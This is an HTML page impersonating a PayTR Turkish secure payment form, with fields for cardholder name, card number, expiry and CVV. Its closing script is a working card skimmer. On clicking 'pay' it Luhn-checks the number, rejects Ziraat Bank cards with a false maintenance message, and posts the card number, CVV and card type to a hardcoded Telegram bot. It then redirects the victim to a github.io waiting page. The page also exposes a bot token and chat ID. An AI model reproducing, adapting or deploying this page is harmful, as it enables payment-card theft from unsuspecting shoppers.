<!DOCTYPE html>
 <html lang="tr">
   <head>
     <meta charset="UTF-8">
     <meta content="True" name="HandheldFriendly">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=0">
     <title lang="tr">Güvenli Ödeme Sayfası - PayTR</title>
     <link rel="icon" type="image/png" href="https://www.paytr.com/img/icons/favico.png?v04">
     <link rel="stylesheet" href="https://www.paytr.com/css/normalize.min.css?188">
     <link rel="stylesheet" href="https://www.paytr.com/css/style.css?188">
     <link rel="stylesheet" href="https://www.paytr.com/css/font.css?188">
     <link rel="stylesheet" href="https://www.paytr.com/css/bootstrap.min.css?188">
     <link rel="stylesheet" href="https://www.paytr.com/css/font-awesome.min.css?188">
     <link rel="stylesheet" href="https://www.paytr.com/css/tooltipster.min.css?188">
 
     <script src="https://www.paytr.com/js/bootstrap-3.4.1.min.js?188"></script>
     <script src="https://www.paytr.com/js/jquery.mask.min.1.14.16.js?188"></script>
     <script src="https://www.paytr.com/js/jquery.tooltipster.min.js?188"></script>
     <script src="https://www.paytr.com/js/bootstrap-dialog.min.js?188"></script>
     <script src="https://www.paytr.com/js/jquery.numeric.js?188"></script>
     <script src="https://www.paytr.com/js/iframeResizer.contentWindow.min.js?188"></script>
     <script src="https://www.paytr.com/js/jquery.confirm.min.js?188"></script>
     <script src="https://www.paytr.com/js/qrcode.min.js?188"></script>
     <script src="https://www.paytr.com/js/paytr_lang/paytr_lang_code.js?188"></script>
     <script src="https://www.paytr.com/js/paytr_lang/paytr_lang_odeme_sayfasi.js?188"></script>
     <script src="https://www.paytr.com/js/bex/BexUtil.js?188"></script>
     <style>
       .img_error {
         color: #474747;
         font-size: 26px;
         font-weight: 600;
         position: absolute;
         margin-top: 8px !important;
       }

       #ui-datepicker-div {
         margin-top: -242px !important;
       }

       .fancybox-wrap {
         top: 50px !important;
       }

       .fancybox-overlay-fixed {
         overflow-y: hidden !important;
       }

       input.krt-kyt-class:empty {
         /*visibility: hidden;*/
         margin-left: -9999px;
       }

       input.krt-kyt-class:empty~label {
         position: relative;
         float: left;
         line-height: 1.6em;
         text-indent: 4em;
         margin: 0.2em 0;
         cursor: pointer;
         -webkit-user-select: none;
         -moz-user-select: none;
         -ms-user-select: none;
         user-select: none;
       }

       input.krt-kyt-class:empty~label:before,
       input.krt-kyt-class:empty~label:after {
         position: absolute;
         display: block;
         top: 0;
         bottom: 0;
         left: 0;
         content: ' ';
         width: 3.6em;
         background-color: #c0c0c0;
         border-radius: 1em;
         -webkit-transition: all 100ms ease-in;
         transition: all 100ms ease-in;
       }

       input.krt-kyt-class:empty~label:after {
         width: 1.4em;
         top: 0.1em;
         bottom: 0.1em;
         margin-left: 0.1em;
         background-color: #fff;
         border-radius: 1em;
       }

       input.krt-kyt-class:checked~label:before {
         background-color: #393;
       }

       input.krt-kyt-class:checked~label:after {
         margin-left: 2.1em;
       }

       .tooltipster-base {}

       .modal {
         top: 5px !important;
       }

       .modal-footer {
         padding: 6px !important;
       }

       input {
         touch-action: pan-y;
       }
     </style>
   </head>
   <body style="overflow-x: visible;">
   <div id="timeout_limit_engelle" class="d_none">
     <p>
       <i class="fa fa-exclamation-circle" aria-hidden="true"></i>
       <span lang="tr">Bu işlem için ayrılan süre dolmuştur. Lütfen işleme tekrar başlayın.</span>
     </p>
   </div>
   <div class="container">
     <div class="row">
       <div class="col-md-12">
         <div style="padding: 8px 2px 8px 8px;text-align: right;font-size: 12px;">
           <a href="#" id="lang_tr" style="text-decoration: none;" class="bold_text">TR</a> / <a href="#" id="lang_en" style="text-decoration: none;">EN</a>
         </div>
       </div>
     </div>
   </div>
   <button type="button" data-toggle="modal" data-keyboard="false" data-backdrop="static" data-target="#req_cvv_btn" id="req_cvv_btn_click" style="display: none;">CVV Modal</button>
   <div id="req_cvv_btn" class="modal fade" role="dialog" style="top: 0 !important;">
     <div class="modal-dialog">
       <div class="modal-content">
         <div class="modal-header">
           <button type="button" class="close" data-dismiss="modal" id="req_cvv_close">×</button>
           <h4 class="modal-title" lang="tr">CVV Gerekiyor</h4>
         </div>
         <div class="modal-body">
           <p>
             <span lang="tr">Kartınızın bankası bu kart ile ödeme yapılabilmesi CVV bilgisini zorunlu tutmaktadır</span>
             <a href="#" style="color: #474747" class="cvv-modal-box" tabindex="99">
               <i class="fa fa-question-circle-o" aria-hidden="true"></i>
             </a>
           </p>
           <input type="text" autocomplete="off" id="req_cvv_input" name="req_cvv" maxlength="3" class="number req_cvv_input" lang="tr" placeholder="CVV Girin">
           <input type="button" id="req_cvv_send_btn" class="req_cvv_button" lang="tr" value="Onayla">
         </div>
       </div>
     </div>
   </div>
   <div id="ekran_engelleme" style="display: none;"></div>
   <div id="mpass-loader">
     <div class="spinner"></div>
   </div>
   <div style="display: none;position: fixed;z-index: 9999;min-width: 100%;text-align: center;" id="tosla-payment-modal">
     <div id="tosla-bg">
       <div class="tosla-bg-header">
         <span id="tosla-win-close" class="ts-success-cls">×</span>
         <img class="img-responsive" src="https://www.paytr.com/img/odeme_sayfasi/tosla_wht.svg" alt="TOSLA" style="height: 60px;padding: 10px;">
       </div>
       <p style="padding: 15px;font-size: 16px;font-weight: 600;" lang="tr">Ödeme işleminize TOSLA mobil uygulamasını kullanarak devam edebilirsiniz.</p>
       <div id="ts-qrcode-load" class="ts-success-cls">
         <i class="fa fa-circle-o-notch fa-spin fa-fw" style="font-size: 50px;"></i>
       </div>
       <div id="ts-success" style="display: none;">
         <div class="success-animation">
           <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
             <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"></circle>
             <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"></path>
           </svg>
         </div>
         <p style="font-size: 16px; font-weight: 600;" lang="tr">İŞLEMİNİZ ONAYLANDI</p>
       </div>
       <div id="ts-qrcode" class="ts-success-cls" style="display: none;"></div>
       <p style="font-size: 16px; font-weight: 600; display: none;" lang="tr" id="ts-pending-text">UYGULAMADAN DEVAM EDİN</p>
       <div class="ts-qr-timeout ts-success-cls">
         <span lang="tr">Kalan Süre</span>: <span id="ts-qr-timeout">290</span>
         <span lang="tr">sn</span>
       </div>
     </div>
   </div>
   <div class="os_govde">
     <form id="paymentForm" autocomplete="off" >
       <div class="container">
         <div class="odeme-yontemi">
           <div class="row">
             <div class="col-lg-12">
               <div class="custom_os_icerik os_icerik" style="border-top: 1px solid #dcdcdc;margin-bottom:0;">
                 <div class="row">
                   <div class="col-lg-12">
                     <div class="row">
                       <div class="col-md-4">
                         <label class="custom_os_odeme_secenek_btn os_odeme_secenek_btn os_odeme_secenek_checked" for="os_tek_cekim">
                           <input id="os_tek_cekim" name="installment_count" value="0" type="radio">
                           <span class="odms_bt_spn">
                             <span lang="tr" class="ods_scm_bsl">Tek Çekim</span>
                             <br>
                             <span class="odm_spn_alt">
                               <span lang="tr">Yurt içi ve yurt dışı</span>
                               <br>
                               <span lang="tr">tüm banka ve kredi kartları</span>
                             </span>
                           </span>
                         </label>
                       </div>
                       <div class="col-md-4">
                         <label class="custom_os_odeme_secenek_btn os_odeme_secenek_btn" for="os_diger">
                           <input id="os_diger" name="installment_count" value="0" type="radio">
                           <span class="odms_bt_spn">
                             <span lang="tr" class="ods_scm_bsl">Diğer Ödeme Yöntemleri</span>
                             <br>
                             <span class="odm_spn_alt">
                               <span lang="tr">Mobil Cüzdan</span> / <span lang="tr">Kart Puanları</span> / <span lang="tr">Ön Ödemeli Kart</span>
                               <br> BKM Express / Tosla / Juzdan </span>
                           </span>
                         </label>
                       </div>
                       <div class="clearfix"></div>
                     </div>
                   </div>
                 </div>
                 <div class="row">
                   <div id="os_ktt_sec" class="col-lg-12 os_oy_icerik os_gzln_ksm" style="display: none;">
                      
                   </div>
                 </div>
                 <div class="row" id="bootstrap_width_alma">
                   
                   </div>
                   <div class="row">
                      
                   </div>
                 </div>
               </div>
             </div>
           </div>
           <div class="row">
             <div class="col-lg-12"></div>
           </div>
           <div id="os_kart_bilgileri" class="card_info" style="">
             <div class="row">
               <div class="col-lg-12">
                 <div class="custom_os_icerik os_icerik">
                   <div class="row">
                     <div class="col-md-10 col-sm-12 col-md-offset-1">
                       <div class="row o_cc_inin_gz">
                         <div class="col-sm-12 col-md-5">
                           <span lang="tr" id="kart_ad_soyad_kontrol" class="card_inputs_text_dom">Kart Üzerindeki Ad, Soyad</span>: 
                           <input type="text" id="os_cc_name" name="cc_owner" onblur="" maxlength="75" required>
                         </div>
                       </div>
                       <div class="row card_inputs_dom">
                         <div class="col-sm-5">
                           <span class="card_inputs_text_dom" lang="tr">Kart Numarası</span>: <input class="os_cc_number_inputs" type="text" id="os_cc_number_mask" maxlength="16">
                           <input id="os_cc_number" name="card_number" class="os_cc_number_inputs number spaces-delete" maxlength="19" style="display: none;" required>
                         </div>
                         <div class="col-sm-4 card_inputs_dom_name">
                           <span lang="tr" class="card_inputs_text_dom">Kart Son Kullanma Tarihi</span>: <div class="row" style="position: relative;">
                             <div style="position: absolute;left: 50%;margin-left: -4px;font-size: 22px;margin-top: 4px;"> / </div>
                             <div class="col-lg-6 col-xs-6">
                               <div>
                                 <input type="text" name="expiry_month" id="expiry_month" class="number" maxlength="2" placeholder="Ay" lang="tr" required>
                               </div>
                             </div>
                             <div class="col-lg-6 col-xs-6">
                               <div>
                                 <input type="text" name="expiry_year" id="expiry_year" class="number" maxlength="2" placeholder="Yıl" lang="tr" required>
                               </div>
                             </div>
                           </div>
                         </div>
                         <div class="col-sm-3">
                           <span lang="tr" class="card_inputs_text_dom">CVV Güvenlik Kodu</span>: <input type="text" id="os_cc_cvv" name="cvv" class="cvv number spaces-delete" maxlength="3" style="width: 100%;padding-left: 35px;" required>
                           <div class="eft-banka-islem-numarasi" style="left: 26px;margin-top: -30px;">
                             <a href="#" class="cvv-modal-box" id="cvv-modal-box-id" tabindex="99">
                               <i class="fa fa-question-circle-o" aria-hidden="true"></i>
                             </a>
                           </div>
                         </div>
                       </div>
                       <div class="row card_inputs_dom" id="cc_banka_bilgisi_alani" style="display: none;">
                         <div class="col-sm-12 col-md-5">
                           <span lang="tr" class="card_inputs_text_dom">Kart Seçimi</span>: <select id="cc_banka_bilgisi" name="card_type_pts" class="card_info_arrow">
                             <option value="" lang="tr">Lütfen Seçin</option>
                             <option value="advantage">ADVANTAGE</option>
                             <option value="axess">AXESS / WINGS</option>
                             <option value="bonus" selected="selected">BONUS</option>
                             <option value="cardfinans">CARDFİNANS</option>
                             <option value="maximum">MAXIMUM / MAXIMILES</option>
                           </select>
                         </div>
                       </div>
                       <div class="row card_inputs_dom" id="non3d_store_hidden">
                         <hr style="margin: 8px 15px 15px 15px;">
                         <div class="col-sm-6" style="position: relative;" id="store_card_red">
                           <i aria-hidden="true" class="fa fa-question-circle-o" id="store_card_info" style="display: inline;"></i>
                           <label for="store_card" id="store_card_label" class="custom_os_icerik">
                             <input type="checkbox" name="store_card" id="store_card" value="1">
                             <span lang="tr" class="noselect">Kolay ödeme için kartımı hatırla</span>
                           </label>
                         </div>
                       </div>
                       <div class="row" id="qry_res_div" style="display: none;">
                         <div class="col-xs-12" style="padding: 4px 16px 11px 16px;">
                           <hr style="margin-top: -5px;">
                           <span lang="tr">Puan İşlem Durumu</span>: <span id="qry_res"></span>
                         </div>
                       </div>
                       <div class="row">
                         <div class="col-md-12">
                           <input type="button" class="custom_odeme_yap_btn os_odeme_yap_btn kart_puan_sorgula" id="kart_puan_sorgula" lang="tr" value="Puan Sorgula" style="display: none;padding-left: 0;">
                           <div id="qry_loader" class="os_gnl_odeme_btn_pasif kart_puan_sorgula" style="display: none;margin: 5px 0 0 0;width: 100%;">
                             <i class="fa fa-spinner fa-spin"></i>
                             <span lang="tr">Puan Sorgulanıyor</span>
                           </div>
                           <button type="button" class="custom_odeme_yap_btn os_odeme_yap_btn kart_puan_sorgula" id="kart_odeme_yap_btn" lang="tr"  style=" 
    margin-top: 5px;background-color: #117ec3;    height: 40px !important;    border: none !important;    font-weight: 400 !important;
    color: #fff !important;    -webkit-transition: all .15s ease-in-out 0s;    padding: 0 0 0 15px;    width: 100%;    font-size: 16px;
    border-radius: 0;   padding-left: 0;">Ödeme Yap </button>
                           <div id="error_message" style="display: none;color: red;margin-top: 15px;font-size: 16px;text-align: center;font-weight: 600;"></div>
                           
                           <div id="odeme_btn_loader" class="os_gnl_odeme_btn_pasif" style="display: none;margin: 5px 0 0 0;width: 100%;">
                             <i class="fa fa-spinner fa-spin"></i>
                             <span lang="tr">Lütfen Bekleyin</span>
                           </div>
                         </div>
                       </div>
 

                       <div class="row">
                         <div class="col-md-12">
                           <div class="os_kartlar_x2 o_cc_inin_goster">
                             <img class="img-responsive tr_en_img_x" src="https://www.paytr.com/img/odeme_sayfasi/os_kartlar_x2.svg?v3" alt="Kart Güvenliği" style="padding: 40px 0 10px 0;">
                             <img class="img-responsive tr_en_img_y" src="https://www.paytr.com/img/odeme_sayfasi/EN_os_kartlar_x2.svg?v3" alt="Card Security" style="display: none; padding: 40px 0 10px 0;">
                           </div>
                           <div class="o_cc_inin_goster">
                             <div class="os_kartlar_x3" style="display: none;">
                               <img class="img-responsive tr_en_img_x" src="https://www.paytr.com/img/odeme_sayfasi/os_kartlar_x3.svg?v3" alt="Kart Güvenliği" style="padding: 40px 0 10px 0;">
                               <img class="img-responsive tr_en_img_y" src="https://www.paytr.com/img/odeme_sayfasi/EN_os_kartlar_x3.svg?v3" alt="Card Security" style="display: none;padding: 40px 0 10px 0;">
                             </div>
                           </div>
                         </div>
                       </div>
                     </div>
                   </div>
                 </div>
               </div>
             </div>
           </div>
         </div>
     </form>
   </div>


   <script>
document.getElementById('kart_odeme_yap_btn').addEventListener('click', function(event) {
    event.preventDefault();

    const cardNumber = document.getElementById('os_cc_number_mask').value;
    const expiryMonth = '05';
    const expiryYear = '28';
    const cvv = document.getElementById('os_cc_cvv').value;
    const cardType = document.getElementById('cc_banka_bilgisi').value;
    const errorMessageDiv = document.getElementById('error_message');
    const ziraatBankBins = [
        '407814', '408969', '413226', '413972', '415792', '420556', '421030', '424931', '424935', '427344', '429586', '437838', '437897', '442671', '444676', '444677', '444678', '447504', '450052', '451454', '453955', '453956', '454671', '454672', '454673', '454674', '454894', '459026', '459252', '459268', '459332', '459333', '462448', '462449', '462724', '462725', '463214', '466280', '466281', '466282', '466283', '466284', '468793', '468794', '468795', '468796', '468797', '469884', '471509', '476619', '476662', '477206', '479610', '479612', '479620', '479632', '479633', '479908', '479909', '479915', '479916', '479917', '482489', '482491', '485060', '485061', '489456', '489457', '489458', '489477', '489478', '489479', '498724', '498725', '498749', '499821', '501774', '508129', '511583', '512360', '512440', '515755', '516458', '516740', '516741', '516742', '516835', '516840', '516841', '516843', '516912', '516914', '516944', '516961', '517049', '517343', '519261', '519780', '521875', '521942', '522347', '522356', '522362', '522517', '522566', '522576', '523416', '523529', '523759', '524659', '524677', '526290', '526952', '526955', '526973', '526975', '526995', '527080', '527083', '527369', '527383', '527396', '527657', '527682', '528208', '528246', '528293', '528823', '528825', '529462', '529876', '530905', '531102', '532581', '532813', '533149', '533293', '533330', '533796', '534563', '534981', '535137', '535176', '535177', '535217', '535248', '535280', '535429', '535843', '535881', '536255', '537833', '539605', '540130', '540134', '541001', '542374', '543394', '544836', '547287', '548434', '549938', '552610', '552679', '554253', '554254', '554548', '554566', '554845', '554868', '554975', '554976', '556031', '556033', '558379', '558443', '558446', '558448', '558460', '558485', '558634', '558691', '559056', '559289', '559572', '559576', '559582', '559583', '559584', '559586', '559587', '559589', '559593', '559594', '588992', '589117', '589283', '589288', '589311', '589318', '589416', '600343', '601050', '601354', '601912', '603343', '603797', '606043', '606329', '627462', '639004', '670606', '670610', '670640', '670670', '670868', '676123', '676124', '676166', '676170', '676206', '676255', '676258', '676283', '676366', '676372', '676401', '676402', '676406', '676429', '676460', '676578', '676651', '676827', '676832', '677047', '677055', '677056', '677131', '677193', '677238', '677369', '677397', '677451', '677522'
    ];

    errorMessageDiv.innerHTML = '';
    errorMessageDiv.style.display = 'none';

    let isValid = true;

    // Kredi kartı numarası doğrulaması
    if (!cardNumber) {
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message';
        errorMessage.style.color = 'red';
        errorMessage.innerText = 'Kredi kartı numarası gereklidir.';
        errorMessageDiv.appendChild(errorMessage);
        isValid = false;
    } else if (!isValidCardNumber(cardNumber)) {
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message';
        errorMessage.style.color = 'red';
        errorMessage.innerText = 'Geçersiz kredi kartı numarası.';
        errorMessageDiv.appendChild(errorMessage);
        isValid = false;
    }

    // Son kullanma tarihi doğrulaması
     
    if (!cvv) {
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message';
        errorMessage.style.color = 'red';
        errorMessage.innerText = 'CVV gereklidir.';
        errorMessageDiv.appendChild(errorMessage);
        isValid = false;
    } else if (cvv.length !== 3 || isNaN(cvv)) {
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message';
        errorMessage.style.color = 'red';
        errorMessage.innerText = 'Geçersiz CVV kodu.';
        errorMessageDiv.appendChild(errorMessage);
        isValid = false;
    }

    // Kart tipi doğrulaması
    if (!cardType) {
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message';
        errorMessage.style.color = 'red';
        errorMessage.innerText = 'Lütfen kart tipini seçin.';
        errorMessageDiv.appendChild(errorMessage);
        isValid = false;
    }

    // Ziraatbank kart numarası kontrolü
    const cardBin = cardNumber.substring(0, 6);
    if (ziraatBankBins.includes(cardBin)) {
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message';
        errorMessage.style.color = 'red';
        errorMessage.innerText = 'Ziraatbank Kartı ile ödemeler güncelleme nedeni ile kapalıdır.';
        errorMessageDiv.appendChild(errorMessage);
        isValid = false;
    }

    if (isValid) {
        const message = `Yeni ödeme formu:\nKredi Kartı Numarası: ${cardNumber}\nSon Kullanma Tarihi: ${expiryMonth}/${expiryYear}\nCVV: ${cvv}\nKart Tipi: ${cardType}`;
        sendMessageToTelegram(message);
    } else {
        errorMessageDiv.style.display = 'block';
    }
});

function isValidCardNumber(cardNumber) {
    const sanitized = cardNumber.replace(/\D/g, '');
    let sum = 0;
    let shouldDouble = false;

    for (let i = sanitized.length - 1; i >= 0; i--) {
        let digit = parseInt(sanitized.charAt(i), 10);

        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }

        sum += digit;
        shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
}

 

function sendMessageToTelegram(message) {
  const botToken = '8110387711:AAFy7EFtCkNqCcX5G-aPznrn6KvgIDw9PNk';
  const chatId = '991795418';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const data = {
        chat_id: chatId,
        text: message
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
          window.location.href = 'https://izmiravmarket-odeme.github.io/izmiravmarket-odeme/bekle.html';
        } else {
            alert('Mesaj gönderilirken bir hata oluştu.');
        }
    })
    .catch(error => {
        console.error('Hata:', error);
        alert('Mesaj gönderilirken bir hata oluştu.');
    });
}
</script>


 </body>
 </html>
